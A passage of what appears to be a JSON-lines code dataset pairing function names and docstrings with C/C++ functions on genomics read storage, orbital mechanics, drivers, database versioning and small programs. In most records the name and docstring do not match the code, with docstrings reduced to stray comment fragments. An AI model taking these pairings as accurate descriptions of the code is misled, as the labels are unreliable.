}\\n        found = getIdByName(readId, fragStore.readNameStoreCache, mate);\\n    }\\n\\n    if (found)\\n    {\\n        if ((flag & 1) == 1)\\n        {\\n            \/\/ if the read is in the store and paired\\n            \/\/ check the mate pair store if it is the same mate of the pair\\n            \/\/ assuming that only one flag 0x040 or 0x0080 is 1\\n            int inPair = 1 - ((flag & 0x40) >> 6);    \/\/ bit 7 is set => inPair = 0\\n                                                    \/\/ else inPair = 1 (even if bits 6 and 7 are not set)\\n\\n            TId matePairId = fragStore.readStore[readId].matePairId;\\n            if (matePairId != TMatePairElement::INVALID_ID)\\n            {\\n                readId = fragStore.matePairStore[matePairId].readId[inPair];\\n                if (readId == TMatePairElement::INVALID_ID)\\n                {\\n                    \/\/ create new entry in read and read name store\\n                    \/\/ set sequence and mate pair ID in new read store element\\n                    readId = appendRead(fragStore, readSeq, matePairId);\\n                    \/\/ add the identifier to the read name store\\n                    appendName(fragStore.readNameStoreCache, qname);\\n                    \/\/ set the ID in the mate pair store\\n                    fragStore.matePairStore[matePairId].readId[inPair] = readId;\\n                    return true;\\n                }\\n                \/\/ else == I am already in the store\\n            }\\n            \/\/ else == my mate said he has no mate (do nothing)\\n        }\\n        return false;\\n    }\\n\\n    \/\/ if the read name is not in the store\\n    \/\/ create new entry in read and read name store\\n    readId = length(fragStore.readStore);\\n\\n    \/\/ if the read is paired\\n    if ((flag & 1) == 1)\\n    {\\n        TMatePairElement mateElem;\\n        \/\/ set the first or second read ID in the mate pair element\\n        TId matePairId = length(fragStore.matePairStore);\\n        mateElem.readId[(flag & 0x80) >> 7] = readId;\\n        \/\/ get a new mate pair ID and add the new mate pair element\\n        appendValue(fragStore.matePairStore, mateElem);\\n        \/\/ set the new mate pair ID in the read element\\n        appendRead(fragStore, readSeq, matePairId);\\n    }\\n    \/\/ if read is not paired\\n    else\\n        appendRead(fragStore, readSeq);\\n\\n    appendName(fragStore.readNameStoreCache, qname);\\n    return true;\\n}\"}","id":2438}
{"content":"{'function_name': 'evaluation', 'docstring': '\/\/ \u8981\u8bb0\u5f97\u521d\u59cb\u5316\\r', 'code': 'bool init_solution(vector<int>& assignment, vector<int>& facility_used, data& m_data, vector<int>& m_random) {\\r\\n  \/\/ \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5546\u5e97\uff0c\u987a\u5e8f\u5b89\u6392\u987e\u5ba2\uff0c\u5bb9\u91cf\u6ee1\u4e86\u4e4b\u540e\u518d\u968f\u673a\u9009\u62e9\u53e6\u4e00\u4e2a\u5546\u5e97\uff0c\u91cd\u590d\u8fd9\u4e2a\u8fc7\u7a0b\\r\\n  \/\/ \u521d\u59cb\u89e3\u4e2d\u672a\u5f00\u653e\u7684\u5546\u5e97\u610f\u5473\u7740\u6c38\u8fdc\u5173\u95ed\uff0c\u540e\u7eed\u4e0d\u4f1a\u5b89\u6392\u987e\u5ba2\u8fc7\u53bb\\r\\n  int p = get_random(m_data.facility_num);\\r\\n  m_random.push_back(p);\\r\\n  for(int i = 0; i < m_data.customer_num; i++) {\\r\\n    while(true) {\\r\\n      int facility = p;\\r\\n      if(m_data.facility_capacity[facility]-facility_used[facility] >= m_data.customer_demand[i]) {\\r\\n        assignment[i] = facility;\\r\\n        facility_used[facility] += m_data.customer_demand[i];\\r\\n        break;\\r\\n      } else {\\r\\n        while(true) {\\r\\n          p = get_random(m_data.facility_num);\\r\\n          if(find(m_random.begin(), m_random.end(), p) == m_random.end()) {\\r\\n            m_random.push_back(p);\\r\\n            break;\\r\\n          }\\r\\n          if(m_random.size() == m_data.facility_num)\\r\\n            return false; \/\/ \u5f53\u524d\u7684\u7b56\u7565\u5bfc\u81f4\u65e0\u6cd5\u5b89\u6392\u5b8c\u6240\u6709\u987e\u5ba2\uff0c\u629b\u5f03\u6b64\u6b21\u521d\u59cb\u89e3\\r\\n        }\\r\\n      }\\r\\n    }\\r\\n  }\\r\\n  return true;\\r\\n}'}","id":2442}
{"content":"{'function_name': 'getIngredients', 'docstring': '\/\/ Last we figure out the ingredient\\r', 'code': 'int main()\\r\\n{\\r\\n    \/\/ Setting up the variables and objects needed\\r\\n    IngredientList recipe;\\r\\n    ofstream outputFile;\\r\\n    StepList steps;\\r\\n    string phrase;\\r\\n    string name;\\r\\n    int numberOfIngredients;\\r\\n    \/\/ Getting the name for the recipe and to be able to name the file\\r\\n    cout << \"what is the name of the recipe: \";\\r\\n    getline(cin, name);\\r\\n    string fileName = ExePath() + \"\\\\\\\\\" + name + \".txt\";\\r\\n    outputFile.open(fileName);\\r\\n    \/\/ Verifying that the file is opened\\r\\n    if (!outputFile) {\\r\\n        cout << \"Crumb!\" << endl;\\r\\n    }\\r\\n    cin.sync();\\r\\n    \/\/ Getting the number of ingredients and then getting the ingredients\\r\\n    cout << \"How many ingredients are there: \";\\r\\n    cin >> numberOfIngredients;\\r\\n    cin.ignore();\\r\\n    for (int i = 0; i < numberOfIngredients; i++) {\\r\\n        cout << \"Ingredient: \";\\r\\n        getline(cin, phrase);\\r\\n        if (validatePhrase(phrase)) {\\r\\n            getIngredients(phrase, recipe);\\r\\n        }\\r\\n        else {\\r\\n            i--;\\r\\n            cout << \"[!] Please enter a number, unit of measurement and the ingredient, each separated by a space\" << endl;\\r\\n        }\\r\\n    }\\r\\n    \/\/ Getting the number of steps and then getting the steps\\r\\n    int numberOfSteps;\\r\\n    cout << \"How many steps are there: \";\\r\\n    cin >> numberOfSteps;\\r\\n    cin.ignore();\\r\\n    for (int i = 0; i < numberOfSteps; i++) {\\r\\n        cout << \"Step \" << i + 1 << \": \";\\r\\n        getline(cin, phrase);\\r\\n        getSteps(phrase, steps, i + 1);\\r\\n    }\\r\\n    \/\/ Printing the results to the screen and to the file\\r\\n    cout << endl << endl;\\r\\n    cout << \"\\\\t\" << name << endl;\\r\\n    outputFile << endl << endl;\\r\\n    outputFile << \"\\\\t\" << name << endl;\\r\\n    recipe.print_ingredient_list(outputFile);\\r\\n    cout << endl;\\r\\n    outputFile << endl;\\r\\n    steps.print_step_list(outputFile);\\r\\n    outputFile.close();\\r\\n    return 0;\\r\\n}'}","id":2445}
{"content":"{'function_name': 'migrate_receive', 'docstring': \"\/* if we get SIGPIPE we'd rather just have it as an error *\/\", 'code': 'uint32_t main_create(const char *filename)\\n{\\n    struct domain_create dom_info;\\n    int paused = 0, debug = 0, daemonize = 1, console_autoconnect = 0,\\n        quiet = 0, monitor = 1, vnc = 0, vncautopass = 0;\\n    int  rc;\\n\/\/    char extra_config[1024];\\n\\n    memset(&dom_info, 0, sizeof(dom_info));\\n    dom_info.debug = debug;\\n    dom_info.daemonize = daemonize;\\n    dom_info.monitor = monitor;\\n    dom_info.paused = paused;\\n    dom_info.dryrun = dryrun_only;\\n    dom_info.quiet = quiet;\\n    dom_info.config_file = filename;\\n    dom_info.extra_config = NULL;\\n    dom_info.migrate_fd = -1;\\n    dom_info.vnc = vnc;\\n    dom_info.vncautopass = vncautopass;\\n    dom_info.console_autoconnect = console_autoconnect;\\n\\n    uint32_t domid = 0;\\n    rc = create_domain(&dom_info, &domid);\\n    if (rc < 0)\\n        return -1;\\n\\n    return domid;\\n}'}","id":2447}
{"content":"{'function_name': 'getPQ', 'docstring': \"\/\/str+='\/';\\r\", 'code': 'long long getN2(long long data)\\r\\n{\\r\\n\\tlong long res=0;\\r\\n\/\/\\tint temp=data>>1;\\r\\n\\twhile(data>1)\\r\\n\\t{\\r\\n\\t\\tdata=data>>1;\\r\\n\\t\\tres++;\\r\\n\\t}\\r\\n\\treturn res;\\r\\n}'}","id":2459}
{"content":"{'function_name': 'GetColumn', 'docstring': '\/\/ DEBUG', 'code': 'MagicBox3 MagicMinBox(int iQuantity, const Fvector* akPoint) {\\n    int iMaxLevel = 8;\\n    int iMaxBracket = 8;\\n    int iMaxIterations = 32;\\n    PointArray kPA(iQuantity, akPoint);\\n    MinimizeND<3> kMinimizer(Volume, iMaxLevel, iMaxBracket, iMaxIterations, &kPA);\\n\\n    float afA0[3] = { 0.0f, 0.0f, 0.0f };\\n\\n    float afA1[3] = { PI, PI_DIV_2, PI };\\n\\n    \/\/ compute some samples to narrow down the search region\\n    float fMinVolume = flt_max;\\n    float afAngle[3], afAInitial[3];\\n    const int iMax = 3;\\n    for (int i0 = 0; i0 <= iMax; i0++) {\\n        afAngle[0] = afA0[0] + i0 * (afA1[0] - afA0[0]) \/ iMax;\\n        for (int i1 = 0; i1 <= iMax; i1++) {\\n            afAngle[1] = afA0[1] + i1 * (afA1[1] - afA0[1]) \/ iMax;\\n            for (int i2 = 0; i2 <= iMax; i2++) {\\n                afAngle[2] = afA0[2] + i2 * (afA1[2] - afA0[2]) \/ iMax;\\n                float fVolume = Volume(afAngle, &kPA);\\n                if (fVolume < fMinVolume) {\\n                    fMinVolume = fVolume;\\n                    afAInitial[0] = afAngle[0];\\n                    afAInitial[1] = afAngle[1];\\n                    afAInitial[2] = afAngle[2];\\n                }\\n            }\\n        }\\n    }\\n\\n    float afAMin[3], fVMin;\\n    kMinimizer.GetMinimum(afA0, afA1, afAInitial, afAMin, fVMin);\\n\\n    MagicBox3 kBox;\\n    MinimalBoxForAngles(iQuantity, akPoint, afAMin, kBox);\\n    return kBox;\\n}'}","id":2469}
{"content":"{'function_name': 'real_to_string', 'docstring': '\/\/\/ \\\\todo convert real number to string', 'code': 'string string_hex_real(numtype number, int size, int precision, int flags) {\\n\\n\\tstring result;\\n\\tconst char *digits = (flags & string_large) ? \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\" : \"0123456789abcdefghijklmnopqrstuvwxyz\";\\n\\n\\t\/\/\/ \\\\todo convert real number to hex string\\n\\n\\treturn result;\\n}'}","id":2472}
{"content":"{'function_name': 'resetTurn', 'docstring': '\/\/Reset the turn to 0.', 'code': 'int getTurn(void){\\t\\t\/\/Return the value of turn.\\n\\treturn turn;\\n}'}","id":2477}
{"content":"{'function_name': 'ee2coe', 'docstring': '\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d', 'code': 'void mee2coe(int&flag, double* coe, const double* mee, int orbtype, double mu)\\n{\\n\\tflag=0;\\n\\tif(mu<=0.0||abs(orbtype)!=1||mee[0]<=0.0)\\n\\t\\treturn;\\n\\n\\tdouble p=mee[0], f=mee[1], g=mee[2], h=mee[3], k=mee[4], L=mee[5];\\n\\tcoe[1]=sqrt(f*f+g*g);\\n\\tif(coe[1]==1.0)\\n\\t\\tcoe[0]=0.5*p;\/\/\u629b\u7269\u7ebf\u8f68\u9053\u7684\u8fd1\u661f\u8ddd\\n\\telse\\n\\t\\tcoe[0]=p\/(fabs(1.0-coe[1]*coe[1]));\/\/\u534a\u957f\u8f74\\n\\tdouble temp=sqrt(h*h+k*k);\\n\\tif(temp>1.0)\\n\\t{\\n\/\/\\t\\tcout<<\"\u7b2c4\u4e0e5\u4e2a\u8f68\u9053\u6839\u6570\u5e73\u65b9\u548c\u4e0d\u80fd\u5927\u4e8e1.\"<<endl;\\n\\t\\treturn;\\n\\t}\\n\\tif(orbtype==1)\\n\\t\\tcoe[2]=2.0*atan(temp);\\n\\telse\\n\\t\\tcoe[2]=2.0*(DPI\/2.0-atan(temp));\\n\\tif(temp<=0.0)\\n\\t{\\n\\t\\tcoe[3]=0.0;\/\/\u5347\u4ea4\u70b9\u8d64\u7ecf\\n\/\/\\t\\tcout<<\"\u8f68\u9053\u503e\u89d2\u63a5\u8fd10\u6216180\u5ea6,\u5347\u4ea4\u70b9\u8d64\u7ecf\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;\\n\\t\\tif(coe[1]<=0.0)\\n\\t\\t{\\n\\t\\t\\tcoe[4]=0.0;\/\/\u8fd1\u661f\u70b9\u5e45\u89d2\\n\/\/\\t\\t\\tcout<<\"\u504f\u5fc3\u7387\u63a5\u8fd10,\u8fd1\u661f\u70b9\u5e45\u89d2\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;        \\n\\t\\t\\tcoe[5]=L;\/\/\u771f\u8fd1\u70b9\u89d2\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tcoe[4]=atan2(g,f); \/\/\u8fd1\u661f\u70b9\u5e45\u89d2       \\n\\t\\t\\tcoe[5]=L-coe[4];\\n\\t\\t}\\n\\t}\\n\\telse\\n\\t{\\n\\t\\tcoe[3]=atan2(k,h);\\n\\t\\tcoe[5]=L-orbtype*coe[3];\\n\\t\\tif(coe[1]<=0.0)\\n\\t\\t{\\n\\t\\t\\tcoe[4]=0.0;\\n\/\/\\t\\t\\tcout<<\"\u504f\u5fc3\u7387\u63a5\u8fd10,\u8fd1\u661f\u70b9\u5e45\u89d2\u5bb9\u6613\u5947\u5f02.\u5728\u6b64\u5c06\u5176\u7f6e\u4e3a\u96f6.\"<<endl;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tcoe[4]=atan2(g*h-orbtype*f*k,f*h+orbtype*g*k);\\n\\t\\t\\tcoe[5]=coe[5]-coe[4];\\n\\t\\t}\\n\\t}\\n\\t\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d\\n\\tcoe[3]=fmod(coe[3], D2PI);\\n\\tif(coe[3]<0.0)\\n\\t\\tcoe[3]+=D2PI;\\n\\tcoe[4]=fmod(coe[4], D2PI);\\n\\tif(coe[4]<0.0)\\n\\t\\tcoe[4]+=D2PI;\\n\\tcoe[5]=fmod(coe[5], D2PI);\\n\\tif(coe[5]<0.0)\\n\\t\\tcoe[5]+=D2PI;\\n\\tif(coe[1]>=1.0)\\n\\t{\\n\\t\\tif(coe[5]>DPI-acos(1.0\/coe[1]))\\n\\t\\t\\tcoe[5]-=D2PI;\\n\\t\\telse if(coe[5]<-DPI+acos(1.0\/coe[1]))\\n\\t\\t\\tcoe[5]+=D2PI;\\n\\t}\\n\\tflag=1;\\n\\treturn;\\n}'}","id":2479}
{"content":"{'function_name': 'rev', 'docstring': '\/\/r+1\u7684\u5de6\u513f\u5b50\u5373\u4e3a\u533a\u95f4[l,r],\u6253\u6807\u8bb0\u66f4\u65b0', 'code': 'int get_sum(int l,int r){\/\/\u6c42[l,r]\u7684\u548c \\n\\tsplay(Find(root,l),root);\\n\\tsplay(Find(root,r+2),root->son[1]);\\n\\treturn root->son[1]->son[0]->sum; \\n}'}","id":2481}
{"content":"{'function_name': 'ang', 'docstring': '\/\/ }', 'code': 'int main(int argc, char const *argv[])\\n{\\n\\tcin>>w>>h;\\n\\tswap(w,h);\\n\\tpoint a,b;\\n\\tint r;\\n\\ta.scan();\\n\\tscanf(\"%d\",&r);\\n\\tfor(int i = 0;i < w; ++i)\\n\\t{\\n\\t\\tfor(int j = 0;j < h; ++j)\\n\\t\\t{\\n\\t\\t\\tpoint now = point(double(i + 0.5),double(j + 0.5));\\n\\t\\t\\tif((now.x - a.x) * (now.x - a.x) + (now.y - a.y) * (now.y - a.y) <= r * r)\\n\\t\\t\\t{\\n\\t\\t\\t\\tmp[i][j] = 1;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\ta.scan();\\n\\tb.scan();\\n\\tpoint cen = point((a.x + b.x) \/ 2,(a.y + b.y) \/ 2);\\n\\tpoint ad = point(a.x - cen.x,a.y - cen.y);\\n\\tpoint p = point(-ad.y,ad.x);\\n\\t\/\/ cur.print();\\n\\tpoint c = point(cen.x + p.x,cen.y + p.y);\\n\\tpoint d = point(cen.x - p.x,cen.y - p.y);\\n\\tpoly[0] = a,poly[1] = c,poly[2] = b,poly[3] = d;\\n\\t\/\/ a.print(),c.print(),b.print(),d.print();\\n\\t\/\/ insidepolygon(a,1);\\n\\tfor(int i = 0;i < w; ++i)\\n\\t{\\n\\t\\tfor(int j = 0;j < h; ++j)\\n\\t\\t{\\n\\t\\t\\tpoint now = point(double(i + 0.5),double(j + 0.5));\\n\\t\\t\\t\/\/ if(i == 2 && j == 47)\\n\\t\\t\\t\/\/ {\\n\\t\\t\\t\/\/ \\tinsidepolygon(now,1);\\n\\t\\t\\t\/\/ }\\n\\t\\t\\tif(insidepolygon(now))\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/ now.print();\\n\\t\\t\\t\\tmp[i][j] = 1;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\tfor(int i = 0;i < w; ++i)\\n\\t{\\n\\t\\tfor(int j = 0;j < h; ++j)\\n\\t\\t{\\n\\t\\t\\tif(mp[i][j] == 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tprintf(\"#\");\\n\\t\\t\\t}\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\tprintf(\".\");\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tprintf(\"\\\\n\");\\n\\t}\\n\\treturn 0;\\n}'}","id":2485}
{"content":"{'function_name': 'ahci_notify_events', 'docstring': '\/\/ struct cam_path *dpath;', 'code': 'static void ahci_done(struct ahci_channel *ch, PacketAtaio *ataio) {\\n  mtx_assert(&ch->mtx, MA_OWNED);\\n  if ((ataio->func_code & XPT_FC_QUEUED) == 0 || ch->batch == 0) {\\n    \/\/ xpt_done(ccb);\\n    ch->dev->GetMasterClass<AhciChannel>()->DonePacket(ataio);\\n    return;\\n  }\\n\\n  \/\/\\tSTAILQ_INSERT_TAIL(&ch->doneq, &ccb->ccb_h, sim_links.stqe);\\n  ch->dev->GetMasterClass<AhciChannel>()->tmp_doneq.Push(ataio);\\n}'}","id":2486}
{"content":"{'function_name': 'DBISetVersion', 'docstring': '\/\/  We handle this, by skipping the update.', 'code': 'ERR ErrDBLGVersionUpdate(\\n    _In_    const INST * const              pinst,\\n    _In_    PIB * const                     ppib,\\n    _In_    const IFMP                      ifmp,\\n    _In_    const FormatVersions * const    pfmtversDesired,\\n    _In_    const BOOL                      fDbNeedsUpdate )\\n{\\n    ERR err = JET_errSuccess;\\n    FMP * const pfmp = &g_rgfmp[ifmp];\\n    OnDebug( BOOL fPersistedLogVerHoldingBackLogUpgrade = fFalse );\\n\\n    BOOL fLogVersionChanged = fFalse;\\n\\n    Assert( g_rgfmp[ ifmp ].FLogOn() );\\n    Assert( pinst->m_plog->FRecoveringMode() != fRecoveringUndo );\\n\\n    if ( pfmtversDesired->efv >= JET_efvSetDbVersion &&\\n        pinst->m_plog->ErrLGFormatFeatureEnabled( pfmtversDesired->efv ) < JET_errSuccess )\\n    {\\n        Call( ErrLGWaitForWrite( ppib, &lgposMax ) );\\n        if ( pinst->m_plog->ErrLGFormatFeatureEnabled( pfmtversDesired->efv ) < JET_errSuccess )\\n        {\\n            fLogVersionChanged = pinst->m_plog->FLGFileVersionUpdateNeeded( pfmtversDesired->lgv );\\n\\n            \/\/  Log rollover if there\\'s log version change\\n            if ( fLogVersionChanged && pinst->m_plog->ErrLGFormatFeatureEnabled( pfmtversDesired->efv ) < JET_errSuccess )\\n            {\\n                OnDebug( const LONG lgenBefore = pinst->m_plog->PlgfilehdrForVerCtrl()->le_lGeneration );\\n                CHAR    szTrace[ 100 ];\\n                LGPOS   lgposRoll;\\n                OSStrCbFormatA( szTrace, sizeof( szTrace ), \"Demand upgrade to lrtypSetDbVer (dbid:%d)\", pfmp->Dbid() );\\n                Call( ErrLGForceLogRollover( ppib, szTrace, &lgposRoll ) );\\n                Call( ErrLGWaitForWrite( ppib, &lgposRoll ) );\\n\\n                Assert( lgenBefore < pinst->m_plog->PlgfilehdrForVerCtrl()->le_lGeneration );\\n                Assert( lgenBefore <= pinst->m_plog->PlgfilehdrForVerCtrl()->le_lGeneration );\\n#ifdef DEBUG\\n                \/\/  if still not upgraded and we\\'re set to use persisted version, check to see if the persisted\\n                \/\/  version is holding back the upgrade.\\n                if ( pinst->m_plog->ErrLGFormatFeatureEnabled( pfmtversDesired->efv ) < JET_errSuccess &&\\n                        UlParam( pinst, JET_paramEngineFormatVersion ) == JET_efvUsePersistedFormat )\\n                {\\n                    const LogVersion * plgvDesired = NULL;\\n                    CallS( pinst->m_plog->ErrLGGetPersistedLogVersion( pfmtversDesired->efv, &plgvDesired ) );\\n                    const FormatVersions * pfmtverRequiredForSetDbVersion = NULL;\\n                    CallS( ErrGetDesiredVersion( NULL, pfmtversDesired->efv, &pfmtverRequiredForSetDbVersion ) );\\n                    fPersistedLogVerHoldingBackLogUpgrade = CmpLgVer( *plgvDesired, pfmtverRequiredForSetDbVersion->lgv ) < 0;\\n                }\\n                if ( !fPersistedLogVerHoldingBackLogUpgrade )\\n                {\\n                    Assert( !pinst->m_plog->FLGFileVersionUpdateNeeded( pfmtversDesired->lgv ) );\\n                    Assert( pinst->m_plog->ErrLGFormatFeatureEnabled( pfmtversDesired->efv ) >= JET_errSuccess );\\n                }\\n#endif\\n            }\\n        }\\n    }\\n\\n    \/\/  We could do this instead\\n    \/\/      if ( fDbNeedsUpdate && pinst->m_plog->ErrLGFormatFeatureEnabled( JET_efvSetDbVersion ) < JET_errSuccess )\\n    \/\/  So one could avoid logging if !fDbNeedsUpdate (and indeed we later avoid re-setting\\n    \/\/  the same value in the header and definitely want to avoid an extra header IO), BUT\\n    \/\/  due to nothing really protecting HA inc-reseed from removing a log file that SetDbVer\\n    \/\/  LR that hasn\\'t played into this DB, but has to played into others, it can lead to an\\n    \/\/  inconsistent view of the actual DB version.  And then a subsequent active who happened\\n    \/\/  to replay the SetDbVer will not re-log it if we avoid relogging where the header isn\\'t\\n    \/\/  out of date.  What I don\\'t like about this, is the passive DB will play forward with\\n    \/\/  an inaccurate DB version, so instead we\\'ll just always log the latest DB Ver on attach\\n    \/\/  (you could think of it as being part of the attach LR) so that the inconsistency will\\n    \/\/  be as temporary as possible, the next active will re-log the current DB ver and the\\n    \/\/  passive the inc-reseeded the hdr update away will get a fresh one from the next active\\n    \/\/  whether he has the current DB ver or a behind one.  Hope that made sense.\\n    \/\/\\n    if ( pinst->m_plog->ErrLGFormatFeatureEnabled( JET_efvSetDbVersion ) >= JET_errSuccess )\\n    {\\n        LGPOS logposT;\\n\\n        \/\/ It might seem like an Assert, but do-time, nor even redo of DBISetVersion will let\\n        \/\/ you take a DB backwards.  It is always one way.\\n        Expected( CmpDbVer( pfmp->Pdbfilehdr()->Dbv(), pfmtversDesired->dbv ) <= 0 );\\n\\n        Call( ErrLGSetDbVersion( ppib, ifmp, pfmtversDesired->dbv, &logposT ) );\\n\\n        \/\/  And because of the spitting out of an unnecessary LR for the update, then we have \\n        \/\/  to smack our HeaderUpdateState() forward to realize it is ok to do this cycle in \\n        \/\/  this special case.\\n        if ( !fDbNeedsUpdate )\\n        {\\n            OnDebug( pfmp->SetDbHeaderUpdateState( FMP::DbHeaderUpdateState::dbhusUpdateSet ) );\\n            OnDebug( pfmp->SetDbHeaderUpdateState( FMP::DbHeaderUpdateState::dbhusUpdateFlushed ) );\\n        }\\n    }\\n    else\\n    {\\n#ifdef DEBUG\\n        if ( fDbNeedsUpdate )\\n        {\\n            \/\/  Log and DB upgrade together for SetDbVersion, so if we can\\'t log it, DB version should be \\n            \/\/  lower than this - which is legal.\\n            const FormatVersions * pfmtverSetDbVer = NULL;\\n            CallS( ErrGetDesiredVersion( NULL, JET_efvSetDbVersion, &pfmtverSetDbVer ) );\\n            \/\/ We\\'re faking this ... because normally we would want to log, but since we\\'re running\\n            \/\/ on pre SetDbVer LR, we can\\'t log, so fake we logged.\\n            Assert( CmpDbVer( pfmp->Pdbfilehdr()->Dbv(), pfmtverSetDbVer->dbv ) < 0 );\\n            Assert( pinst->m_plog->ErrLGFormatFeatureEnabled( JET_efvSetDbVersion ) < JET_errSuccess );\\n            pfmp->SetDbHeaderUpdateState( FMP::DbHeaderUpdateState::dbhusUpdateLogged );\\n        }\\n#endif\\n    }\\n\\nHandleError:\\n\\n    return err;\\n}'}","id":2487}
{"content":"{'function_name': 'galsPoint', 'docstring': '\/\/     }', 'code': 'int galsPoint(double Fs, double Ls, double K0, double V0, double V1, float T, float t, float a, int rotate, double R, double *Fc, double *Lc, double *Fm, double *Lm, double *Km, double *Vm)\\n{\\n    if(T <= 0)\\n    {\\n        puts(\"Sysmath galsPoint function ERROR: Negative or null gals time\");\\n        return -1;\\n    }\\n\/\/     if(t > T)\\n\/\/     {\\n\/\/         puts(\"Sysmath galsPoint function ERROR: Current time more than gals time\");\\n\/\/         return -2;\\n\/\/     }\\n\\tif (t>T) t = T;\\n    \\n    rotate=(rotate < 0)?-1:1;\\n    double Xc = rotate * R*cos(rad(K0));\\n    double Yc = -rotate * R*sin(rad(K0));\\n    CXYFL(Fs,Ls,Xc,Yc,Fc,Lc);\\n    \\n\\tif (ABS(V1-V0)<NOL)\\n\\t{\\n\\t\\tdouble lm = (V0*t) \/ 1000;\\n\\t\\tdouble fi = lm\/R;\\n\\t\\tdouble Xm = (-Xc)*cos(fi) + rotate*(-Yc)*sin(fi) + Xc;\\n\\t\\tdouble Ym = -rotate*(-Xc)*sin(fi) + (-Yc)*cos(fi) + Yc;\\n\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\tif(Km)\\n        {\\n            *Km = K0 + rotate*grad(fi);\\n            *Km += (*Km > 360)?-360:(*Km < 0)?360:0;\\n        }\\n\\t\\tif(Vm) *Vm = V0;\\n\/\/\\t\\tprintf(\"___1___fi=%.2f\\\\n\", grad(fi));\\n\\t\\treturn 1;\\t\\n\\t} else\\n\\t{\\n\\t\\ta = sign(V1-V0)*a;\\n\\t\\tdouble _t = (V1-V0)\/a;\\t\\n\\t\\t\\n\/\/\\t\\tprintf(\"---- Tr = %.1f; t = %.1f; Tgals = %.1f\\\\n\", _t, t, T);\\n\\t\\t\\n\\t\\tif (_t>t)\\n\\t\\t{\\n\\t\\t\\tdouble lm = (V0*t + a*t*t\/2) \/ 1000;\\n\\t\\t\\tdouble fi = lm\/R;\\n\\t\\t\\tdouble Xm = (-Xc)*cos(fi) + rotate*(-Yc)*sin(fi) + Xc;\\n\\t\\t\\tdouble Ym = -rotate*(-Xc)*sin(fi) + (-Yc)*cos(fi) + Yc;\\n\\t\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\t\\tif(Km)\\n            {\\n                *Km = K0 + rotate*grad(fi);\\n                *Km += (*Km > 360)?-360:(*Km < 0)?360:0;\\n            }\\n\\t\\t\\tif(Vm) *Vm = a*t + V0;\\n\/\/\\t\\t\\tprintf(\"___2___fi=%.2f\\\\n\", grad(fi));\\n\\t\\t\\treturn 1;\\n\\t\\t}\\t\\t\\n\\n\\t\\tdouble S = V0*_t+a*_t*_t\/2;\\n\\t\\tdouble tr = t-_t;\\n\\t\\tdouble lm = (V1*tr + S)\/1000.0;\\t\\t\\n\\n\\t\\tdouble fi = lm\/R;\\n\\t\\tdouble Xm = (-Xc)*cos(fi) + rotate*(-Yc)*sin(fi) + Xc;\\n\\t\\tdouble Ym = -rotate*(-Xc)*sin(fi) + (-Yc)*cos(fi) + Yc;\\n\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\tif(Km)\\n        {\\n            *Km = K0 + rotate*grad(fi);\\n            *Km += (*Km > 360)?-360:(*Km < 0)?360:0;\\n        }\\n\\t\\tif(Vm) *Vm = V1;\\n\/\/\\t\\tprintf(\"___3___fi=%.2f\\\\n\", grad(fi));\\n\\t\\treturn 1;\\t\\t\\n\\t}\\n}'}","id":2492}
{"content":"{'function_name': 'createDirectoryWithFiles', 'docstring': '\/\/partition', 'code': 'static bool WriteImageBinaryAsString(std::string directoryPath, std::string imageName, std::string ext, std::string content){\\n\\t\\tcv::Mat image = Base2Mat(content);\\n\\t\\tcv::imwrite(directoryPath + \"\/\" + imageName + \".\" + ext, image);\\n\\n  \/\/ content = base64_decode(content);\\n  \/\/ std::ofstream wf(imageFullPath, std::ios::out | std::ios::binary);\\n\\t\/\/ if(!wf) {\\n\\t\/\/ \\tstd::cout << \"Cannot open Fake \\\\\"\" + imageFullPath + \"\\\\\" for writing\" << std::endl;\\n\\t\/\/ \\treturn false;\\n\\t\/\/ }\\n\\t\/\/ wf.write((char *) &content, sizeof(content));\\n\\t\/\/ wf.close();\\n  return true;\\n}'}","id":2495}
{"content":"{'function_name': 'DataWriter', 'docstring': '\/\/ verify that clearing the disc recorder works', 'code': 'int __cdecl wmain(int argc, WCHAR *argv[])\\n{\\n    HRESULT coInitHr = S_OK;\\n    HRESULT hr = S_OK;\\n    PROGRAM_OPTIONS options;\\n\\n    SYSTEMTIME startTime;\\n    SYSTEMTIME endTime;\\n    SYSTEMTIME elapsedTime;\\n\\n    if ( !ParseCommandLine( argc-1, argv+1, &options ) )\\n    {\\n        PrintHelp(argv[0]);\\n        hr = E_INVALIDARG;\\n        return hr;\\n    }\\n    else\\n    {\\n        \/\/PrintOptions(&options);\\n    }\\n\\n    \/\/ Get start time for total time\\n    GetSystemTime(&startTime);\\n\\n    if (CAtlBaseModule::m_bInitFailed)\\n    {\\n        printf(\"AtlBaseInit failed...\\\\n\");\\n        coInitHr = E_FAIL;\\n    }\\n    else\\n    {\\n        \/\/ printf(\"AtlBaseInit passed...\\\\n\");\\n        coInitHr = S_OK;\\n    }\\n\\n    if ( SUCCEEDED(coInitHr) && options.ListWriters )\\n    {\\n        hr = ListAllRecorders();\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Erase )\\n    {\\n        hr = EraseMedia( options.WriterIndex, options.FullErase );\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Write )\\n    {\\n        hr = DataWriter(options);\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Image )\\n    {\\n        hr = ImageWriter(options);\\n    }\\n    if ( SUCCEEDED(coInitHr) && options.Audio )\\n    {\\n        hr = 